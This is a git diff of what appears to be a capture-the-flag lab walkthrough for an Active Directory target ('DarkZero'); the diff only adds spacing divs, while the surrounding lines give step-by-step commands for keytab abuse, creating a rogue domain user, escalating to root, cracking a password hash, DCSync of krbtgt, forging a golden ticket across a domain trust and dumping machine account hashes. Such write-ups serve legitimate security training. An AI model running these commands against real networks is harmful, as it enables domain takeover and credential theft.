@@ -442,6 +442,9 @@ ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3 'id; 
 ```bash
 ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3
 ```
+<div align="center">
+<br>
+</div>
 
 ### Recover domain credential
 
@@ -452,6 +455,9 @@ export KRB5CCNAME=/tmp/krb5cc_gitea
 kinit -kt /etc/gitea-runner/svc-runner.keytab svc-runner
 klist
 ```
+<div align="center">
+<br>
+</div>
 
 ### LDAP bind
 
@@ -460,6 +466,9 @@ ldapsearch -x -H ldap://172.16.20.2 -s base -b '' dnsHostName defaultNamingConte
 echo "SASL_NOCANON on" > ~/.ldaprc
 ldapwhoami -Y GSSAPI -H ldap://DC02.darkzero.ext
 ```
+<div align="center">
+<br>
+</div>
 
 ### Find writable OU + confirm create rights
 
@@ -478,6 +487,9 @@ userAccountControl: 514
 EOF
 ldapadd -Y GSSAPI -H ldap://DC02.darkzero.ext -f /tmp/test.ldif
 ```
+<div align="center">
+<br>
+</div>
 
 ### Create domain user `root`
 
@@ -515,6 +527,9 @@ KRB5CCNAME=/tmp/krb5cc_rootuser klist
 ```
 
 > `kinit` will prompt `Password for root@DARKZERO.EXT:` — type the password you set above (`P@ssw0rd123`) and press Enter. A "password expires in 2100" warning is harmless. `klist` should then show a TGT for `root@DARKZERO.EXT`. Note: the `-` line between the two replace blocks in setpw.ldif is required LDIF syntax — do not remove it.
+<div align="center">
+<br>
+</div>
 
 ### ksu to local root
 
@@ -524,6 +539,9 @@ KRB5CCNAME=/tmp/krb5cc_rootuser ksu root
 ```
 
 Prompt becomes `#`. You are root on SRV01.
+<div align="center">
+<br>
+</div>
 
 ### Read backup
 
@@ -534,6 +552,9 @@ grep -iA5 'INSERT INTO `users`' /root/darkzero_campaigns_backup.sql | head -20
 ```
 
 > ⚠ copy celia's bcrypt hash.
+<div align="center">
+<br>
+</div>
 
 ### Crack celia (Kali) + confirm privs (SRV01 root)
 
@@ -552,6 +573,9 @@ KRB5CCNAME=/tmp/krb5cc_gitea LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI -H ldap://
   -b "CN=System,DC=darkzero,DC=ext" "(objectClass=trustedDomain)" \
   trustPartner trustDirection trustAttributes 2>&1 | grep -iE 'trustPartner|trustDirection|trustAttributes'
 ```
+<div align="center">
+<br>
+</div>
 
 ### Tunnel (Kali T2, leave running) + DCSync krbtgt (Kali T1)
 
@@ -588,6 +612,9 @@ print('DOMAIN SID (use this):', '-'.join(full.split('-')[:-1]))
 ```
 
 The `DOMAIN SID` line (no trailing RID) is your `-domain-sid` value. ⚠ save it.
+<div align="center">
+<br>
+</div>
 
 ### Find crossing SID (SRV01 root)
 
@@ -619,6 +646,9 @@ print('CROSSING SID (use whole thing):', 'S-%d-%d-'%(d[0],auth)+'-'.join(map(str
 ```
 
 Result ends in `-1603`. ⚠ save the **whole** SID — it's your `-extra-sid` value (unlike the domain SID, do NOT drop the RID)
+<div align="center">
+<br>
+</div>
 
 ### Forge ticket (Kali T1) — ⚠ your aes key, source SID, crossing SID:
 
@@ -631,6 +661,9 @@ impacket-ticketer -aesKey <KRBTGT_AES256> \
 
 export KRB5CCNAME=$(pwd)/administrator.ccache
 ```
+<div align="center">
+<br>
+</div>
 
 ### Plumbing (Kali T1). hosts + krb5.conf:
 
@@ -666,6 +699,9 @@ date -u   # confirm it matches the DC, not 4-5h off
 ```
 
 After this, run impacket raw — no faketime needed. If a later command throws `KRB_AP_ERR_SKEW`, re-run `sudo date -u -s '<current DC time>'`.
+<div align="center">
+<br>
+</div>
 
 ### Confirm SID crossed (Kali T1)
 
@@ -681,6 +717,9 @@ exit
 ```
 
 Expect `C$ ADMIN$ NETLOGON` listed.
+<div align="center">
+<br>
+</div>
 
 ### Export hives server-side, then fetch (Kali T1)
 
@@ -711,6 +750,9 @@ impacket-secretsdump -system SYSTEM.save -security SECURITY.save LOCAL
 ```
 
 > Find the line `$MACHINE.ACC: aad3b435...:XXXX:::` — the hash is `LM:NT`. Your value is the part **after** the colon (the NT half). Ignore the `plain_password_hex` line above it. ⚠ save the `$MACHINE.ACC` NT hash.
+<div align="center">
+<br>
+</div>
 
 ### DCSync htb + root (Kali T1) — ⚠ your machine hash, then admin hash:
 
